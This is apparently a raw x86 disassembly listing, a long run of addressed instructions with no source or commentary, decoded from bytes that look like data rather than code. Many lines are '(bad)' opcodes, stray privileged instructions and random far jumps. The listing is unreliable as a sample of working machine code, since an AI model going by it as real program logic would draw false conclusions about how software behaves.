  40abbb:	jge    0x40ac1f
  40abbd:	(bad)  
  40abbe:	cld    
  40abbf:	gs sti 
  40abc1:	das    
  40abc2:	hlt    
  40abc3:	adc    ebp,esp
  40abc5:	mov    WORD PTR [ecx+eiz*8-0x77],?
  40abc9:	gs std 
  40abcb:	xchg   esi,eax
  40abcc:	push   ss
  40abcd:	mov    edx,0xee1a9421
  40abd2:	shr    BYTE PTR ds:0x97fca54b,cl
  40abd8:	push   ecx
  40abd9:	xchg   esp,eax
  40abda:	mov    ch,0x55
  40abdc:	mov    ebx,0x9cc860cb
  40abe1:	push   esp
  40abe2:	ror    ecx,1
  40abe4:	inc    ebp
  40abe6:	jbe    0x40abcf
  40abe8:	lds    edx,FWORD PTR [ecx+ebp*1]
  40abeb:	sub    ebx,0x81d8576a
  40abf1:	ret    
  40abf2:	sub    cl,al
  40abf4:	mov    al,ds:0x902732f4
  40abf9:	test   BYTE PTR [edx],cl
  40abfb:	cmc    
  40abfc:	mov    edi,0xeb9a6cfa
  40ac01:	mov    ecx,esp
  40ac03:	add    al,0x17
  40ac05:	mov    esp,0xdfd88015
  40ac0a:	mov    al,0xbc
  40ac0c:	into   
  40ac0d:	leave  
  40ac0e:	push   0xffffffb7
  40ac10:	jecxz  0x40abf3
  40ac12:	cld    
  40ac13:	imul   ebx,DWORD PTR ss:[eax-0x9],0xffffff82
  40ac18:	or     al,0x36
  40ac1a:	dec    esp
  40ac1b:	mov    ebp,0x892add94
  40ac20:	sub    ah,dh
  40ac22:	mov    dh,0x8e
  40ac24:	sub    BYTE PTR [ebx],0x5
  40ac27:	push   cs
  40ac28:	jmp    0x40abe3
  40ac2a:	mov    dh,BYTE PTR [edx]
  40ac2c:	or     DWORD PTR [edx-0xc],esp
  40ac2f:	leave  
  40ac30:	(bad)  
  40ac31:	fistp  WORD PTR [edi+0x1253e8c2]
  40ac37:	add    edx,DWORD PTR [esi+0x5d]
  40ac3a:	std    
  40ac3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3c:	jge    0x40ac4e
  40ac3e:	daa    
  40ac3f:	push   0xc7eafb82
  40ac44:	xchg   esp,eax
  40ac45:	xchg   esi,eax
  40ac46:	shr    BYTE PTR [ecx-0x2a6b9f8a],cl
  40ac4c:	jmp    0x40ac8a
  40ac4e:	adc    esp,DWORD PTR [ebx-0x6279fef5]
  40ac54:	xchg   esi,eax
  40ac55:	fbstp  TBYTE PTR [edi+eax*1-0x4f]
  40ac59:	and    DWORD PTR [edi],edx
  40ac5b:	hlt    
  40ac5c:	fnstsw WORD PTR [eax]
  40ac5e:	jecxz  0x40ac0a
  40ac60:	dec    edx
  40ac61:	pop    edi
  40ac62:	neg    bh
  40ac64:	arpl   WORD PTR [ecx+0x77],si
  40ac67:	adc    BYTE PTR [edi+0x3],dh
  40ac6a:	dec    ebp
  40ac6b:	jge    0x40ac12
  40ac6d:	loopne 0x40ac6f
  40ac6f:	iret   
  40ac70:	aaa    
  40ac71:	out    dx,eax
  40ac72:	hlt    
  40ac73:	mov    esp,0x39fc9f11
  40ac78:	lods   al,BYTE PTR ds:[esi]
  40ac79:	idiv   DWORD PTR [ebx]
  40ac7b:	call   0x7853:0x7c33675a
  40ac82:	std    
  40ac83:	cmp    bl,dh
  40ac85:	hlt    
  40ac86:	mov    esi,0xfcfca22b
  40ac8b:	fdivr  st(0),st
  40ac8d:	adc    edx,DWORD PTR [ebx]
  40ac8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac90:	inc    eax
  40ac91:	adc    eax,0xe8b4cb9a
  40ac96:	jecxz  0x40ac33
  40ac98:	stos   DWORD PTR es:[edi],eax
  40ac99:	sbb    DWORD PTR [ebp+0x3f],esi
  40ac9c:	cmp    ecx,0x43806afe
  40aca2:	daa    
  40aca3:	sbb    al,0x65
  40aca5:	pop    ds
  40aca6:	(bad)  
  40aca7:	aam    0x39
  40aca9:	fisttp WORD PTR [edx]
  40acab:	int    0x69
  40acad:	addr16 in eax,dx
  40acaf:	jmp    0x72e9:0x12fd53d8
  40acb6:	cmc    
  40acb7:	xor    DWORD PTR [edi+0x38],0x62
  40acbb:	enter  0xf47a,0x7a
  40acbf:	add    ah,dl
  40acc1:	xchg   ebx,eax
  40acc2:	popf   
  40acc3:	push   ds
  40acc4:	jmp    0x40ad03
  40acc6:	push   ebp
  40acc7:	adc    al,0x8d
  40acc9:	xor    BYTE PTR fs:0xc57bce8a,dh
  40acd0:	mov    BYTE PTR [ecx-0x209f6b6d],dl
  40acd6:	xchg   esp,eax
  40acd7:	fcmovnb st,st(7)
  40acd9:	pop    es
  40acda:	sbb    BYTE PTR [edx-0x15],dl
  40acdd:	int3   
  40acde:	sub    al,0xa0
  40ace0:	inc    esp
  40ace1:	lock dec esp
  40ace3:	jne    0x40ad2d
  40ace5:	fnstenv [ebx-0x52]
  40ace8:	jl     0x40ac77
  40acea:	std    
  40aceb:	sahf   
  40acec:	stc    
  40aced:	push   esp
  40acee:	mov    bl,0x98
  40acf0:	loopne 0x40acb4
  40acf2:	ins    DWORD PTR es:[edi],dx
  40acf3:	dec    eax
  40acf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf5:	xor    BYTE PTR [edi],bh
  40acf7:	pushw  es
  40acf9:	or     ch,BYTE PTR [edi+0x467fe2c8]
  40acff:	into   
  40ad00:	pop    eax
  40ad01:	ficomp WORD PTR [edi+0x58a9ebd2]
  40ad07:	js     0x40acd1
  40ad09:	mov    esi,0xdf96a7d6
  40ad0e:	jmp    0x1d6e:0x6d236ebb
  40ad15:	sub    esi,DWORD PTR [ecx]
  40ad17:	hlt    
  40ad18:	add    esp,eax
  40ad1a:	fsub   DWORD PTR [ebx+edi*8]
  40ad1d:	pop    edi
  40ad1e:	data16 sahf 
  40ad20:	lock retf 0xcb5f
  40ad24:	into   
  40ad25:	fstp   DWORD PTR [eax+0xe]
  40ad28:	cli    
  40ad29:	adc    BYTE PTR [ebp+0x210b1846],bh
  40ad2f:	and    ch,dl
  40ad31:	sub    edi,esi
  40ad33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad34:	jle    0x40ad6c
  40ad36:	sahf   
  40ad37:	push   ecx
  40ad38:	push   0xac59dd4c
  40ad3d:	pop    es
  40ad3e:	test   al,0xd7
  40ad40:	jmp    0x40adb8
  40ad42:	jns    0x40acd0
  40ad44:	add    DWORD PTR [esi+ebp*4+0x579dfda5],ecx
  40ad4b:	mov    eax,ds:0x4e2c31ab
  40ad50:	mov    eax,0xdac7fbf0
  40ad55:	mov    al,BYTE PTR [ecx]
  40ad57:	add    edx,eax
  40ad59:	lods   eax,DWORD PTR ds:[esi]
  40ad5a:	arpl   si,cx
  40ad5c:	jmp    0x40ad3b
  40ad5e:	adc    bl,al
  40ad60:	pop    eax
  40ad61:	inc    ebx
  40ad62:	stos   DWORD PTR es:[edi],eax
  40ad63:	inc    BYTE PTR [esi]
  40ad65:	fbstp  TBYTE PTR [ecx-0x2f]
  40ad68:	jle    0x40ad3a
  40ad6a:	pop    ss
  40ad6b:	and    esi,DWORD PTR [ebx+0x1f]
  40ad6e:	std    
  40ad6f:	and    eax,0xf0bb313c
  40ad74:	sbb    al,dh
  40ad76:	mov    ds:0x6dc3c1c8,eax
  40ad7b:	ss nop
  40ad7d:	cld    
  40ad7e:	inc    ebp
  40ad7f:	push   cs
  40ad80:	jmp    0x40adbd
  40ad82:	call   0x6ca5:0xf2ea7f89
  40ad89:	sti    
  40ad8a:	cmp    BYTE PTR [edi-0x5d],ch
  40ad8d:	loopne 0x40adcd
  40ad8f:	mov    WORD PTR [ebp+0x1d481a3e],gs
  40ad95:	pop    ds
  40ad96:	mov    ecx,gs
  40ad98:	jmp    0x40adab
  40ad9a:	pop    ebx
  40ad9b:	sbb    eax,0xf0a0c3bd
  40ada0:	mov    fs,eax
  40ada2:	sar    dh,1
  40ada4:	neg    DWORD PTR [ebp-0x2e]
  40ada7:	push   edi
  40ada8:	push   ebx
  40ada9:	popf   
  40adaa:	les    edx,FWORD PTR [ebx-0x1e]
  40adad:	sub    edi,edx
  40adaf:	inc    edi
  40adb0:	mov    dh,0x7d
  40adb2:	(bad)  
  40adb3:	out    dx,eax
  40adb4:	lods   al,BYTE PTR ds:[esi]
  40adb5:	test   al,0x52
  40adb7:	fcom   QWORD PTR [edi]
  40adb9:	or     esi,DWORD PTR [edi+esi*8+0x5a]
  40adbd:	call   0x45ec7cd5
  40adc2:	mov    al,ds:0x857549f0
  40adc7:	loopne 0x40adb4
  40adc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adca:	and    al,BYTE PTR [eax]
  40adcc:	out    dx,eax
  40adcd:	push   edx
  40adce:	adc    eax,0x830713bf
  40add3:	mov    ds:0x836d0fe6,eax
  40add8:	mov    BYTE PTR [edi-0x66f722b8],bl
  40adde:	sti    
  40addf:	dec    ecx
  40ade0:	pushf  
  40ade1:	mov    al,ch
  40ade3:	mov    dh,0x3b
  40ade5:	add    di,sp
  40ade8:	and    ebx,esi
  40adea:	mov    ah,bh
  40adec:	mov    ds:0x7ed0a667,al
  40adf1:	das    
  40adf2:	leave  
  40adf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf4:	pop    ds
  40adf5:	jnp    0x40adf4
  40adf7:	mov    edx,0xb71469f2
  40adfc:	pop    esi
  40adfd:	mov    al,0x8d
  40adff:	(bad)  
  40ae00:	mov    eax,0x410431ba
  40ae05:	out    dx,eax
  40ae06:	test   eax,0xab9e029
  40ae0b:	bound  esi,QWORD PTR [edi-0x31b60337]
  40ae11:	or     eax,0x6fb0ff5e
  40ae16:	cmp    bl,BYTE PTR [eax-0x41]
  40ae19:	fild   QWORD PTR [esi]
  40ae1b:	das    
  40ae1c:	inc    edx
  40ae1d:	lods   al,BYTE PTR ds:[esi]
  40ae1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae1f:	push   cs
  40ae20:	shl    DWORD PTR [edi],0xfd
  40ae23:	retf   0xea01
  40ae26:	cmp    DWORD PTR [ebp+0x46],0xffffff97
  40ae2a:	xchg   esi,eax
  40ae2b:	cmp    BYTE PTR [eax],0x90
  40ae2e:	std    
  40ae2f:	jmp    0x40ae64
  40ae31:	push   es
  40ae32:	jo     0x40adf9
  40ae34:	lods   eax,DWORD PTR ds:[esi]
  40ae35:	out    dx,eax
  40ae36:	cld    
  40ae37:	icebp  
  40ae38:	cmp    bl,BYTE PTR [edx+edi*4+0x7ee3f6f3]
  40ae3f:	enter  0xc42b,0x92
  40ae43:	addr16 daa 
  40ae45:	mov    al,ds:0x6dda128
  40ae4a:	push   edx
  40ae4b:	retf   
  40ae4c:	inc    esp
  40ae4d:	jno    0x40aec3
  40ae4f:	je     0x40aded
  40ae51:	data16 sub BYTE PTR [ebp-0x1b515bc9],cl
  40ae58:	push   esi
  40ae59:	pop    ds
  40ae5a:	xchg   esp,eax
  40ae5b:	fucomip st,st(3)
  40ae5d:	bound  edx,QWORD PTR [edi+0x1b]
  40ae60:	mov    WORD PTR [ebp-0x75f407be],?
  40ae66:	das    
  40ae67:	cmc    
  40ae68:	jmp    0x40ae21
  40ae6a:	sbb    DWORD PTR [ecx+0x30],esi
  40ae6d:	test   BYTE PTR [edi+ebx*2+0x4a],ch
  40ae71:	into   
  40ae72:	inc    bh
  40ae74:	into   
  40ae75:	add    ebx,DWORD PTR [eax]
  40ae77:	inc    esi
  40ae78:	jge    0x40aebf
  40ae7a:	push   edx
  40ae7b:	inc    ebx
  40ae7c:	jmp    0x40ae0f
  40ae7e:	jg     0x40aebd
  40ae80:	xor    eax,0x8f52f9e0
  40ae85:	fild   QWORD PTR [ebx-0x1f]
  40ae88:	xchg   ebp,eax
  40ae89:	ja     0x40aefc
  40ae8b:	int    0xa8
  40ae8d:	pop    eax
  40ae8e:	std    
  40ae8f:	xlat   BYTE PTR ds:[ebx]
  40ae90:	test   bh,0xea
  40ae93:	and    al,0x7f
  40ae95:	dec    esi
  40ae96:	bswap  eax
  40ae98:	dec    edi
  40ae99:	int3   
  40ae9a:	leave  
  40ae9b:	pushf  
  40ae9c:	fcom   DWORD PTR [edi+edi*8+0x40]
  40aea0:	jmp    0x40aefb
  40aea2:	enter  0xe209,0x55
  40aea6:	adc    ah,BYTE PTR ds:0x90d7dfa4
  40aeac:	and    BYTE PTR [edx-0x4cb97613],0x44
  40aeb3:	xchg   BYTE PTR [eax+0x6d6950e9],dl
  40aeb9:	test   eax,0x4b2007f7
  40aebe:	popf   
  40aebf:	and    ah,BYTE PTR [esi]
  40aec1:	fistp  QWORD PTR [eax+0x5bb1d184]
  40aec7:	popa   
  40aec8:	out    0x22,al
  40aeca:	loop   0x40ae61
  40aecc:	outs   dx,DWORD PTR ds:[esi]
  40aecd:	pop    edi
  40aece:	push   ebx
  40aecf:	sub    eax,0x8ee3db0f
  40aed4:	xor    al,0xdf
  40aed6:	imul   esi,edi,0x58
  40aed9:	outs   dx,BYTE PTR ds:[esi]
  40aeda:	pop    ss
  40aedb:	add    BYTE PTR [esi],al
  40aedd:	sti    
  40aede:	or     ch,dl
  40aee0:	xchg   edx,eax
  40aee1:	mov    dl,0xf8
  40aee3:	dec    ebx
  40aee4:	rol    bh,1
  40aee6:	mov    esp,0xbe868b8d
  40aeeb:	enter  0x9c76,0xe0
  40aeef:	cmp    BYTE PTR [esi],0x5e
  40aef2:	sub    dl,BYTE PTR [eax]
  40aef4:	jmp    0x40aec9
  40aef6:	neg    BYTE PTR ss:[esi+eax*2+0x50]
  40aefb:	sbb    dl,BYTE PTR [ecx-0x21]
  40aefe:	sbb    edi,DWORD PTR [esi-0x73521016]
  40af04:	popf   
  40af05:	aas    
  40af06:	std    
  40af07:	ja     0x40af75
  40af09:	std    
  40af0a:	(bad)  
  40af0b:	mov    dl,0xf0
  40af0d:	and    al,0xea
  40af0f:	enter  0x770f,0xa7
  40af13:	das    
  40af14:	xchg   ecx,eax
  40af15:	sbb    BYTE PTR [ecx+ebx*1],cl
  40af18:	push   0x43
  40af1a:	cli    
  40af1b:	mov    ah,0xee
  40af1d:	ret    
  40af1e:	jbe    0x40af43
  40af20:	mov    edx,0xdb91919f
  40af25:	ss (bad) 
  40af28:	add    BYTE PTR [edx],ah
  40af2a:	or     esi,DWORD PTR [ebx+ebx*2+0x42]
  40af2e:	popf   
  40af2f:	jns    0x40af58
  40af31:	outs   dx,DWORD PTR ds:[esi]
  40af32:	std    
  40af33:	call   0xd47e922f
  40af38:	sbb    cl,bh
  40af3a:	adc    al,0xc8
  40af3c:	dec    ebx
  40af3d:	pop    esi
  40af3e:	cmc    
  40af3f:	push   ds
  40af40:	mov    al,ds:0xeb037584
  40af45:	(bad)  
  40af46:	leave  
  40af47:	pop    eax
  40af48:	pop    esp
  40af49:	mov    ebp,0xdf670ae7
  40af4e:	inc    edx
  40af4f:	jbe    0x40af03
  40af51:	jl     0x40af76
  40af53:	lock push ss
  40af55:	adc    bh,bh
  40af57:	and    eax,0x8a41bcc9
  40af5c:	jae    0x40af7d
  40af5e:	inc    ebx
  40af5f:	js     0x40af55
  40af61:	fist   WORD PTR [ebx+esi*4+0x42edf003]
  40af68:	gs pop edx
  40af6a:	fnstcw WORD PTR [ecx+0xd]
  40af6d:	(bad)  
  40af6e:	cld    
  40af6f:	jle    0x90370c9
  40af75:	sti    
  40af76:	jnp    0x40afa3
  40af78:	xor    ebx,edi
  40af7a:	sub    dh,al
  40af7c:	loope  0x40af67
  40af7e:	xchg   edi,eax
  40af7f:	dec    esi
  40af80:	jmp    FWORD PTR [edi+0x50ab88ae]
  40af86:	dec    esp
  40af87:	leave  
  40af88:	adc    BYTE PTR [esi-0x74c637d2],bl
  40af8e:	shl    DWORD PTR ds:0x8633a659,cl
  40af94:	jmp    0x40b002
  40af96:	ficom  DWORD PTR [esi-0x53]
  40af99:	and    DWORD PTR [eax+edi*2-0x25],ebx
  40af9d:	pop    ds
  40af9e:	arpl   WORD PTR [ebx+0x5b810a2a],bx
  40afa4:	repnz inc eax
  40afa6:	arpl   WORD PTR [eax],bp
  40afa8:	inc    ecx
  40afa9:	pop    edi
  40afaa:	fnstsw WORD PTR [ecx]
  40afac:	daa    
  40afad:	rol    bl,cl
  40afaf:	enter  0x3930,0xa5
  40afb3:	paddq  mm2,QWORD PTR [edx+0x17fd248a]
  40afba:	loopne 0x40aff8
  40afbc:	sbb    BYTE PTR [ebp-0x225ce244],0xfa
  40afc3:	scas   al,BYTE PTR es:[edi]
  40afc4:	fmul   QWORD PTR [edi+0x6d30c826]
  40afca:	cmp    bl,BYTE PTR [edi-0xa]
  40afcd:	cmp    BYTE PTR [ebx-0x43b9141a],dl
  40afd3:	xor    dh,BYTE PTR [ebp+0x46797514]
  40afd9:	fild   QWORD PTR [esi-0x50]
  40afdc:	cmp    al,0x60
  40afde:	ret    
  40afdf:	lock mov bl,0x1b
  40afe2:	std    
  40afe3:	ss jmp 0xe47f:0x6addb302
  40afeb:	mov    ecx,0xc8286d6b
  40aff0:	sti    
  40aff1:	adc    BYTE PTR [ebx-0x1dafa53],0x87
  40aff8:	mov    ch,0x6f
  40affa:	push   0xc10c407a
  40afff:	ins    DWORD PTR es:[edi],dx
  40b000:	repnz (bad) 
  40b003:	imul   esi,esp,0x4fffbf12
  40b009:	push   0xffffffe3
  40b00b:	dec    esi
  40b00c:	neg    bh
  40b00e:	cwde   
  40b00f:	mov    edx,0x53bd06d6
  40b014:	pushf  
  40b015:	xadd   DWORD PTR ds:0x202135cf,edx
  40b01c:	out    0xe6,al
  40b01e:	das    
  40b01f:	sti    
  40b020:	sub    eax,esi
  40b022:	sbb    al,0xda
  40b024:	daa    
  40b025:	pusha  
  40b026:	jp     0x40afe3
  40b028:	mov    ecx,0x2dc87955
  40b02d:	dec    esp
  40b02e:	adc    ecx,DWORD PTR [ebx]
  40b030:	les    edx,FWORD PTR [edi-0x6]
  40b033:	fcom   QWORD PTR [eax+0x2bb4ee45]
  40b039:	das    
  40b03a:	mov    dh,0xc7
  40b03c:	pop    esp
  40b03d:	fincstp 
  40b03f:	sbb    DWORD PTR [eax-0x4372827b],0xede6c1c0
  40b049:	mov    bl,0xdf
  40b04b:	inc    ebp
  40b04c:	and    al,0x3f
  40b04e:	push   ecx
  40b04f:	pusha  
  40b050:	fcmovnbe st,st(1)
  40b052:	pushf  
  40b053:	leave  
  40b054:	inc    ebx
  40b055:	aam    0x18
  40b057:	jmp    FWORD PTR [edx]
  40b059:	inc    esp
  40b05a:	pop    ebp
  40b05b:	cld    
  40b05c:	iret   
  40b05d:	xchg   edx,eax
  40b05e:	hlt    
  40b05f:	dec    edi
  40b060:	leave  
  40b061:	or     ecx,DWORD PTR [ebx-0x5e4a1424]
  40b067:	xor    al,0x3c
  40b069:	or     eax,0x7a99c865
  40b06e:	xchg   edx,eax
  40b06f:	mov    ds:0x8695d079,eax
  40b074:	and    ecx,DWORD PTR [ebp+0x300b01fe]
  40b07a:	inc    edi
  40b07b:	adc    eax,0x89b2372c
  40b080:	mov    esi,DWORD PTR [eax-0x22aa3755]
  40b086:	push   cs
  40b087:	lea    ebp,[ecx+ebp*4+0x67]
  40b08b:	jge    0x40b078
  40b08d:	jae    0x40b0c6
  40b08f:	outs   dx,BYTE PTR ds:[esi]
  40b090:	add    edi,DWORD PTR ds:[eax-0x3b]
  40b094:	out    0xdf,eax
  40b096:	xchg   BYTE PTR [ebp+0x4c],al
  40b099:	mov    ah,0x15
  40b09b:	xor    cl,dl
  40b09d:	imul   edi,ebp,0x1fc4d3f7
  40b0a3:	aad    0xed
  40b0a5:	rcl    BYTE PTR [esi-0x38],0xea
  40b0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0aa:	sbb    eax,0x83985562
  40b0af:	pop    ebx
  40b0b0:	jmp    0x40b036
  40b0b2:	pop    ss
  40b0b3:	es xchg ebx,eax
  40b0b5:	pop    edx
  40b0b6:	(bad)  
  40b0b8:	inc    edi
  40b0b9:	(bad)  
  40b0bb:	pop    ds
  40b0bc:	or     DWORD PTR gs:[edx],ebx
  40b0bf:	xchg   edx,eax
  40b0c0:	retf   0xfc4c
  40b0c3:	mov    dh,0x1c
  40b0c5:	daa    
  40b0c6:	test   BYTE PTR [ebx+edi*1+0x29],0xfc
  40b0cb:	mov    ds:0x217ce91d,al
  40b0d0:	cmc    
  40b0d1:	fisubr WORD PTR [edi]
  40b0d3:	call   DWORD PTR ds:0x9e20c09c
  40b0d9:	mov    ch,bh
  40b0db:	xchg   ecx,eax
  40b0dc:	das    
  40b0dd:	jmp    0xb836d341
  40b0e2:	mov    WORD PTR [eax],cs
  40b0e4:	inc    ecx
  40b0e5:	xor    BYTE PTR [ecx],ah
  40b0e7:	shl    BYTE PTR [esi-0x6ec21e98],1
  40b0ed:	lock js 0x40b0b0
  40b0f0:	jmp    0x40b0d7
  40b0f2:	call   FWORD PTR [eax-0x2cf044ed]
  40b0f8:	sti    
  40b0f9:	sub    DWORD PTR [ebx],ecx
  40b0fb:	jmp    0x6d6c:0x423ac16b
  40b102:	std    
  40b103:	mov    eax,ss:0x53d46e5c
  40b109:	in     al,0xe9
  40b10b:	loop   0x40b164
  40b10d:	js     0x40b10d
  40b10f:	imul   esp,DWORD PTR [ebp+eax*4+0x34],0x57
  40b114:	jno    0x40b13d
  40b116:	dec    ecx
  40b117:	retf   0x65eb
  40b11a:	out    dx,al
  40b11b:	dec    edi
  40b11c:	int3   
  40b11d:	les    edi,FWORD PTR [edx-0x6b1da086]
  40b123:	mov    ebp,0x8722e78
  40b128:	mov    ch,0x51
  40b12a:	jns    0x40b140
  40b12c:	in     al,dx
  40b12d:	mov    al,ds:0xee25738b
  40b132:	in     al,0xb7
  40b134:	aaa    
  40b135:	dec    edx
  40b136:	add    ecx,eax
  40b138:	int    0x46
  40b13a:	mov    ecx,0xcfb71f6b
  40b13f:	aam    0xe6
  40b141:	popa   
  40b142:	mov    ds:0x1d1ecc06,eax
  40b147:	xchg   BYTE PTR [edi+0xf],al
  40b14a:	sbb    al,0x78
  40b14c:	pop    ss
  40b14d:	sub    al,0x5c
  40b14f:	enter  0xde97,0x56
  40b153:	cmc    
  40b154:	pop    edi
  40b155:	mov    ds,WORD PTR [eax]
  40b157:	push   ebx
  40b158:	in     al,dx
  40b159:	sub    eax,0x5e34353
  40b15e:	fld    TBYTE PTR [ebp-0x233f6de5]
  40b164:	cli    
  40b165:	mov    ebx,0x459c857c
  40b16a:	loop   0x40b169
  40b16c:	sbb    esp,eax
  40b16e:	sti    
  40b16f:	icebp  
  40b170:	dec    esp
  40b171:	xchg   esp,eax
  40b172:	jae    0x40b110
  40b174:	mov    eax,edi
  40b176:	outs   dx,BYTE PTR ds:[esi]
  40b177:	ror    DWORD PTR [ebx-0x75956a21],0x96
  40b17e:	fnsave [ecx+0x22fd74db]
  40b184:	sahf   
  40b185:	outs   dx,DWORD PTR ds:[esi]
  40b186:	in     al,0xfd
  40b188:	cld    
  40b189:	mov    eax,ds:0xdf1da24e
  40b18e:	jae    0x40b12a
  40b190:	ret    
  40b191:	addr16 dec ebp
  40b193:	mov    ebp,0x69fd502a
  40b198:	fnsave ds:0x88d36d1d
  40b19e:	xchg   ecx,eax
  40b19f:	enter  0x1e36,0xf2
  40b1a3:	mov    dh,0xfa
  40b1a5:	call   0x962f2d34
  40b1aa:	inc    edx
  40b1ab:	ds in  al,0xbf
  40b1ae:	pushf  
  40b1af:	add    eax,0xc729dd3e
  40b1b4:	(bad)  
  40b1b5:	cmpxchg BYTE PTR [ebx],ah
  40b1b8:	jb     0x40b1ba
  40b1ba:	xchg   edi,eax
  40b1bb:	dec    eax
  40b1bc:	sub    DWORD PTR [eax+0x47],eax
  40b1bf:	or     dl,dh
  40b1c1:	xor    BYTE PTR [ebx+0x2ddfdd7a],0xf3
  40b1c8:	cmp    BYTE PTR [edx],cl
  40b1ca:	cmp    al,0x9d
  40b1cc:	or     ebx,edi
  40b1ce:	jg     0x40b1e8
  40b1d0:	stos   DWORD PTR es:[edi],eax
  40b1d1:	inc    esp
  40b1d2:	pop    ss
  40b1d3:	mov    WORD PTR [esi+eax*2-0x48dc1102],ds
  40b1da:	mov    eax,0x2dc0da8d
  40b1df:	sub    eax,0xb60102cb
  40b1e4:	mov    bh,BYTE PTR [eiz*8+0x7fca80c7]
  40b1eb:	or     bl,BYTE PTR [ecx-0x48a10360]
  40b1f1:	jae    0x40b254
  40b1f3:	jge    0x40b21b
  40b1f5:	xchg   edi,eax
  40b1f6:	mov    bl,0xc8
  40b1f8:	inc    ebx
  40b1f9:	push   edx
  40b1fa:	mov    al,0xb
  40b1fc:	sbb    al,0x1e
  40b1fe:	stos   DWORD PTR es:[edi],eax
  40b1ff:	push   esp
  40b200:	jmp    0x40b279
  40b202:	and    BYTE PTR [ecx],dh
  40b204:	pusha  
  40b205:	imul   ebp,DWORD PTR [ecx-0x4e206546],0xffffffb5
  40b20c:	push   eax
  40b20d:	popf   
  40b20e:	adc    eax,0xfccba367
  40b213:	je     0x40b26f
  40b215:	out    dx,al
  40b216:	retf   
  40b217:	cli    
  40b218:	aas    
  40b219:	hlt    
  40b21a:	(bad)  
  40b21b:	retf   
  40b21c:	push   esi
  40b21d:	enter  0x5f73,0x2c
  40b221:	xor    BYTE PTR [eax-0x1d],0x43
  40b225:	out    0x55,al
  40b227:	sbb    al,0x98
  40b229:	sbb    esp,esi
  40b22b:	mov    ecx,0x48670a7c
  40b230:	dec    esi
  40b231:	daa    
  40b232:	into   
  40b233:	arpl   di,cx
  40b235:	(bad)  [esi+0x20]
  40b238:	pushf  
  40b239:	std    
  40b23a:	cmp    al,0x2d
  40b23c:	add    eax,0x8336c913
  40b241:	outs   dx,BYTE PTR ds:[esi]
  40b242:	sub    bl,BYTE PTR [edx]
  40b244:	jmp    0x40b2a2
  40b246:	in     al,dx
  40b247:	jns    0x40b1f5
  40b249:	es jnp 0x40b2cb
  40b24c:	pop    ecx
  40b24d:	cmp    esi,DWORD PTR [edi-0x1cb4d038]
  40b253:	mov    al,ds:0x220f5fec
  40b258:	in     al,dx
  40b259:	mov    ecx,0x91f284f9
  40b25e:	pop    es
  40b25f:	pusha  
  40b260:	nop    DWORD PTR [ecx]
  40b263:	enter  0x6299,0xd8
  40b267:	mov    bh,0x4b
  40b269:	lds    ecx,FWORD PTR [eax-0x68c814e9]
  40b26f:	iret   
  40b270:	sahf   
  40b271:	(bad)  
  40b272:	scas   eax,DWORD PTR es:[edi]
  40b273:	cmp    al,0x3f
  40b275:	fild   QWORD PTR [ecx]
  40b277:	mov    ecx,ebp
  40b279:	and    eax,0xc3582012
  40b27e:	cld    
  40b27f:	arpl   WORD PTR [eax],cx
  40b281:	in     al,dx
  40b282:	mov    al,0x30
  40b284:	out    dx,al
  40b285:	mov    bl,0xee
  40b287:	int    0x3e
  40b289:	out    0xcc,eax
  40b28b:	sahf   
  40b28c:	sub    al,0xff
  40b28e:	jle    0x40b22f
  40b290:	test   BYTE PTR [edi+0x79],0xde
  40b294:	loopne 0x40b2cc
  40b296:	pop    ss
  40b297:	(bad)  
  40b298:	mov    ecx,0x25aabe9
  40b29d:	loopne 0x40b255
  40b29f:	les    edx,FWORD PTR [eax-0x42]
  40b2a2:	ds enter 0x1293,0x3b
  40b2a7:	inc    esp
  40b2a8:	mov    ah,BYTE PTR [ebp+0x71eb2bfa]
  40b2ae:	mov    DWORD PTR [ebx+0x3daaaa38],edi
  40b2b4:	xor    DWORD PTR ds:0xae7ac85d,0xbb5755ba
  40b2be:	jno    0x40b26f
  40b2c0:	and    ebp,DWORD PTR [edi]
  40b2c2:	std    
  40b2c3:	psubusw mm5,QWORD PTR [esi+0x2a]
  40b2c7:	jmp    0xc8fb38cd
  40b2cc:	inc    esi
  40b2cd:	or     DWORD PTR [ecx-0xf],edx
  40b2d0:	jo     0x40b276
  40b2d2:	pusha  
  40b2d3:	aad    0xeb
  40b2d5:	sub    bl,dh
  40b2d7:	inc    eax
  40b2d8:	cmp    BYTE PTR [edx-0x22242cf7],0x90
  40b2df:	(bad)  
  40b2e0:	into   
  40b2e1:	jno    0x40b34e
  40b2e3:	shr    DWORD PTR [ebx],0x90
  40b2e6:	es jmp 0x40b2d0
  40b2e9:	add    eax,0xb3af0cb8
  40b2ee:	mov    al,ds:0x2d4aeb86
  40b2f3:	or     eax,DWORD PTR [edx]
  40b2f5:	xchg   esp,eax
  40b2f6:	clc    
  40b2f7:	sbb    eax,0x6fe25419
  40b2fc:	jmp    0xce4d:0x50a94b5f
  40b303:	out    dx,eax
  40b304:	rcr    edi,1
  40b306:	daa    
  40b307:	(bad)  
  40b308:	and    ecx,DWORD PTR [ecx-0x10]
  40b30b:	jg     0x40b2c6
  40b30d:	es std 
  40b30f:	mov    cl,BYTE PTR [eax+edi*2-0x5]
  40b313:	sub    al,0xdd
  40b315:	imul   esi,DWORD PTR [ebp+0x5eaa51c],0x2b
  40b31c:	pop    ebx
  40b31d:	or     eax,DWORD PTR [eax]
  40b31f:	mov    esp,gs
  40b321:	xchg   ebx,eax
  40b322:	cmp    dl,BYTE PTR ds:0x48da750b
  40b328:	jmp    0x40b393
  40b32a:	aad    0x1a
  40b32c:	cvtps2pi mm0,xmm4
  40b32f:	ret    
  40b330:	(bad)  
  40b332:	cmp    al,0x91
  40b334:	test   al,0x90
  40b336:	jnp    0x40b2d4
  40b338:	and    al,BYTE PTR [ebx]
  40b33a:	std    
  40b33b:	pop    edi
  40b33c:	ins    DWORD PTR es:[edi],dx
  40b33d:	ds (bad) 
  40b33f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b340:	mov    al,0xec
  40b342:	ror    dh,cl
  40b344:	leave  
